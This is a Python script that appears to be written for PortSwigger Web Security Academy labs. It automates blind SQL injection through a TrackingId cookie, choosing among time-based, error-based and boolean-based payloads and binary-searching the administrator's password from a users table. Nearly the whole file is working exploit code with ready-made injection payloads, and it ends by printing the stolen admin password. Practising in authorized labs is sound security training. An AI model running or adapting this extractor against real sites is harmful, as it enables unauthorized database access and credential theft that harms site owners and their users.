#!/usr/bin/env python3
"""
A small, practical SQLi extractor for authorized testing labs.

Supports time-based, error-based, and boolean-based techniques.
Automatically detects a supported method and uses binary search
to infer password length and characters.

Use only in PortSwigger Web Security Academy labs or other
environments where testing is explicitly authorized.
"""

import requests
import time
import urllib3
from enum import Enum
from getpass import getpass


# ---------- Configuration ----------
class SQLiMethod(Enum):
    TIME_BASED = "time_based"
    ERROR_BASED = "error_based"
    BOOLEAN_BASED = "boolean_based"


class Config:
    def __init__(self):
        self.lab_url = None
        self.session_cookie = None
        self.tracking_prefix = None
        self.method = None
        self.charset = "0123456789abcdefghijklmnopqrstuvwxyz"
        self.min_length = 1
        self.max_length = 64
        self.sleep_duration = 3
        self.true_threshold = 2.0

        # Local Burp Suite intercepting proxy
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }


urllib3.disable_warnings(
    urllib3.exceptions.InsecureRequestWarning
)


class SQLiExtractor:
    """SQL injection extractor with automatic method detection."""

    def __init__(self, config: Config):
        self.config = config
        self.session = requests.Session()

        if config.proxies:
            self.session.proxies.update(config.proxies)

        self.session.headers.update({
            "User-Agent": "Mozilla/5.0",
            "Accept": (
                "text/html,application/xhtml+xml,"
                "application/xml;q=0.9,*/*;q=0.8"
            ),
        })

    # ---------- HTTP helper ----------
    def send_request(self, tracking_id, category="Tech gifts"):
        """Send HTTP GET and return (response, elapsed_seconds)."""

        try:
            start = time.perf_counter()

            resp = self.session.get(
                self.config.lab_url,
                params={"category": category},
                cookies={
                    "TrackingId": tracking_id,
                    "session": self.config.session_cookie
                },
                verify=False,
                timeout=15
            )

            elapsed = time.perf_counter() - start
            return resp, elapsed

        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
            return None, None

    # ---------- Auto-detection ----------
    def test_time_based_detection(self):
        print("[*] Trying time-based technique...")

        baseline = self.config.tracking_prefix + "'"
        _, base_time = self.send_request(baseline)

        if base_time is None:
            print("[!] Baseline request failed.")
            return False

        payload = (
            self.config.tracking_prefix
            + "' || (SELECT CASE WHEN (1=1) THEN pg_sleep("
            + str(self.config.sleep_duration)
            + ") ELSE pg_sleep(0) END FROM users "
            + "WHERE username='administrator') IS NULL--"
        )

        _, sleep_time = self.send_request(payload)

        if sleep_time is None:
            print("[!] Sleep test request failed.")
            return False

        diff = sleep_time - base_time

        print(
            f"    baseline={base_time:.2f}s, "
            f"sleep={sleep_time:.2f}s, diff={diff:.2f}s"
        )

        if diff >= self.config.true_threshold:
            print("[+] Time-based SQLi looks good.")
            return True

        print("[-] Time-based not detected.")
        return False

    def test_error_based_detection(self):
        print("[*] Trying error-based technique...")

        payload = (
            self.config.tracking_prefix
            + "' AND (SELECT CASE WHEN (1=1) "
            + "THEN TO_CHAR(1/0) ELSE 'a' END "
            + "FROM users WHERE username='administrator') = 'a'-- "
        )

        resp, _ = self.send_request(payload)

        if resp is None:
            print("[!] Error test request failed.")
            return False

        print(f"    HTTP {resp.status_code}")

        if resp.status_code == 500:
            print("[+] Error-based SQLi looks good.")
            return True

        print("[-] Error-based not detected.")
        return False

    def test_boolean_based_detection(self):
        print("[*] Trying boolean-based technique...")

        payload = (
            self.config.tracking_prefix
            + "' AND (SELECT CASE WHEN (1=1) "
            + "THEN 1 ELSE 0 END FROM users "
            + "WHERE username='administrator') = 1-- "
        )

        resp, _ = self.send_request(payload)

        if resp is None:
            print("[!] Boolean test request failed.")
            return False

        found = "Welcome back" in resp.text

        print(f"    'Welcome back' in response: {found}")

        if found:
            print("[+] Boolean-based SQLi looks good.")
            return True

        print("[-] Boolean-based not detected.")
        return False

    def auto_detect_method(self):
        print("\n" + "=" * 60)
        print("Auto-detecting SQLi method")
        print("=" * 60 + "\n")

        methods = []

        if self.test_time_based_detection():
            methods.append(SQLiMethod.TIME_BASED)

        print()

        if self.test_error_based_detection():
            methods.append(SQLiMethod.ERROR_BASED)

        print()

        if self.test_boolean_based_detection():
            methods.append(SQLiMethod.BOOLEAN_BASED)

        print()

        if not methods:
            print("[!] No working SQLi method detected.")
            return None

        # Preserve original method priority.
        if SQLiMethod.TIME_BASED in methods:
            chosen = SQLiMethod.TIME_BASED
        elif SQLiMethod.ERROR_BASED in methods:
            chosen = SQLiMethod.ERROR_BASED
        else:
            chosen = SQLiMethod.BOOLEAN_BASED

        print(f"[+] Selected method: {chosen.value}")
        print(
            f"[+] Detected: "
            f"{', '.join(m.value for m in methods)}"
        )

        return chosen

    # ---------- Test helpers ----------
    def is_time_based_true(self, elapsed):
        return elapsed >= self.config.true_threshold

    def is_error_based_true(self, response):
        return response.status_code == 500

    def is_boolean_based_true(self, response):
        return "Welcome back" in response.text

    # ---------- Payload builders ----------
    # Time-based (PostgreSQL)
    def build_time_based_length_payload(self, midpoint):
        return (
            self.config.tracking_prefix
            + "' || (SELECT CASE WHEN (LENGTH(password) > "
            + str(midpoint)
            + ") THEN pg_sleep("
            + str(self.config.sleep_duration)
            + ") ELSE pg_sleep(0) END FROM users "
            + "WHERE username='administrator') IS NULL--"
        )

    def build_time_based_char_payload(self, position, midpoint_char):
        return (
            self.config.tracking_prefix
            + "' || (SELECT CASE WHEN (SUBSTRING(password,"
            + str(position)
            + ",1) > '"
            + midpoint_char
            + "') THEN pg_sleep("
            + str(self.config.sleep_duration)
            + ") ELSE pg_sleep(0) END FROM users "
            + "WHERE username='administrator') IS NULL--"
        )

    # Error-based (Oracle-like)
    def build_error_based_length_payload(self, midpoint):
        return (
            self.config.tracking_prefix
            + "' AND (SELECT CASE WHEN LENGTH(password) > "
            + str(midpoint)
            + " THEN TO_CHAR(1/0) ELSE 'a' END "
            + "FROM users WHERE username='administrator') = 'a'-- "
        )

    def build_error_based_char_payload(self, position, midpoint_ascii):
        return (
            self.config.tracking_prefix
            + "' AND (SELECT CASE WHEN ASCII(SUBSTR(password,"
            + str(position)
            + ",1)) > "
            + str(midpoint_ascii)
            + " THEN TO_CHAR(1/0) ELSE 'a' END "
            + "FROM users WHERE username='administrator') = 'a'-- "
        )

    # Boolean-based
    def build_boolean_based_length_payload(self, midpoint):
        return (
            self.config.tracking_prefix
            + "' AND (SELECT CASE WHEN LENGTH(password) > "
            + str(midpoint)
            + " THEN 1 ELSE 0 END FROM users "
            + "WHERE username='administrator') = 1-- "
        )

    def build_boolean_based_char_payload(self, position, ascii_value):
        return (
            self.config.tracking_prefix
            + "' AND (SELECT CASE WHEN ASCII(SUBSTRING(password,"
            + str(position)
            + ",1)) > "
            + str(ascii_value)
            + " THEN 1 ELSE 0 END FROM users "
            + "WHERE username='administrator') = 1-- "
        )

    # Dispatchers
    def build_length_payload(self, midpoint):
        method = self.config.method

        if method == SQLiMethod.TIME_BASED:
            return self.build_time_based_length_payload(midpoint)

        if method == SQLiMethod.ERROR_BASED:
            return self.build_error_based_length_payload(midpoint)

        return self.build_boolean_based_length_payload(midpoint)

    def build_char_payload(self, position, value):
        method = self.config.method

        if method == SQLiMethod.TIME_BASED:
            return self.build_time_based_char_payload(
                position, value
            )

        if method == SQLiMethod.ERROR_BASED:
            return self.build_error_based_char_payload(
                position, ord(value)
            )

        return self.build_boolean_based_char_payload(
            position, ord(value)
        )

    def test_condition(self, response, elapsed):
        if self.config.method == SQLiMethod.TIME_BASED:
            return self.is_time_based_true(elapsed)

        if self.config.method == SQLiMethod.ERROR_BASED:
            return self.is_error_based_true(response)

        return self.is_boolean_based_true(response)

    # ---------- Password discovery ----------
    def find_password_length(self):
        low = self.config.min_length
        high = self.config.max_length

        print("\n" + "=" * 60)
        print(
            f"Finding password length "
            f"(method={self.config.method.value})"
        )
        print("=" * 60)

        while low < high:
            midpoint = (low + high) // 2
            tid = self.build_length_payload(midpoint)

            resp, elapsed = self.send_request(tid)

            if resp is None:
                return None

            result = self.test_condition(resp, elapsed)

            status = (
                f"{elapsed:.2f}s"
                if self.config.method == SQLiMethod.TIME_BASED
                else f"HTTP {resp.status_code}"
            )

            print(
                f"[>] LENGTH > {midpoint} | {status} | "
                f"{'TRUE' if result else 'FALSE'}"
            )

            if result:
                low = midpoint + 1
            else:
                high = midpoint

        print(f"\n[+] Determined password length: {low}")
        return low

    def find_character(self, position):
        low = 0
        high = len(self.config.charset) - 1

        print("\n" + "-" * 60)
        print(f"Finding char at position {position}")
        print("-" * 60)

        while low < high:
            mid = (low + high) // 2
            mid_char = self.config.charset[mid]

            tid = self.build_char_payload(
                position, mid_char
            )

            resp, elapsed = self.send_request(tid)

            if resp is None:
                return None

            result = self.test_condition(resp, elapsed)

            status = (
                f"{elapsed:.2f}s"
                if self.config.method == SQLiMethod.TIME_BASED
                else f"HTTP {resp.status_code}"
            )

            print(
                f"[>] pos {position} > '{mid_char}' | "
                f"{status} | "
                f"{'TRUE' if result else 'FALSE'} | "
                f"range={low}-{high}"
            )

            if result:
                low = mid + 1
            else:
                high = mid

        ch = self.config.charset[low]

        print(f"[+] Position {position} -> '{ch}'")
        return ch

    def extract_password(self, password_length):
        out = ""

        print("\n" + "=" * 60)
        print("Extracting password")
        print("=" * 60)

        for pos in range(1, password_length + 1):
            ch = self.find_character(pos)

            if ch is None:
                print("[!] Stopped early.")
                return out

            out += ch
            print(f"[+] So far: {out}\n")

        return out

    # ---------- Run ----------
    def run(self):
        print("\n" + "#" * 60)
        print("Quick SQLi extractor")
        print("#" * 60 + "\n")

        print(f"Target: {self.config.lab_url}")
        print(f"Charset: {self.config.charset}")
        print(
            "Proxy: "
            f"{self.config.proxies.get('http') if self.config.proxies else 'none'}\n"
        )

        self.config.method = self.auto_detect_method()

        if not self.config.method:
            print("[!] Aborting - no method detected.")
            return

        length = self.find_password_length()

        if length is None:
            print("[!] Couldn't determine length.")
            return

        passwd = self.extract_password(length)

        print("\n" + "=" * 60)
        print(f"PASSWORD LENGTH: {length}")
        print(f"ADMIN PASSWORD : {passwd}")
        print("=" * 60)


# ---------- Helpers for quick config ----------
def auto_extract_config_from_url(lab_url):
    print("\n[~] Scanning URL for hints...")

    if "/filter" in lab_url:
        print("    Detected /filter endpoint (common lab pattern).")

    return True


def get_automated_configuration():
    cfg = Config()

    print("\n" + "=" * 60)
    print("Automated configuration")
    print("=" * 60 + "\n")

    cfg.lab_url = input("[?] Lab URL: ").strip()

    # Session is entered without echoing it to the terminal.
    cfg.session_cookie = getpass("[?] Session cookie: ").strip()

    cfg.tracking_prefix = input(
        "[?] Tracking ID prefix: "
    ).strip()

    auto_extract_config_from_url(cfg.lab_url)

    use_custom = input(
        "[?] Custom charset/length? (y/N): "
    ).strip().lower()

    if use_custom == "y":
        try:
            cfg.charset = (
                input("[?] Charset (default 0-9a-z): ").strip()
                or cfg.charset
            )

            cfg.min_length = int(
                input("[?] Min length [1]: ").strip() or "1"
            )

            cfg.max_length = int(
                input("[?] Max length [64]: ").strip() or "64"
            )

        except ValueError:
            print("[!] Invalid input — using defaults.")

    return cfg


def main():
    try:
        cfg = get_automated_configuration()
        extractor = SQLiExtractor(cfg)
        extractor.run()

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    except Exception as e:
        print(f"[!] Unexpected error: {e}")


if __name__ == "__main__":
    main()
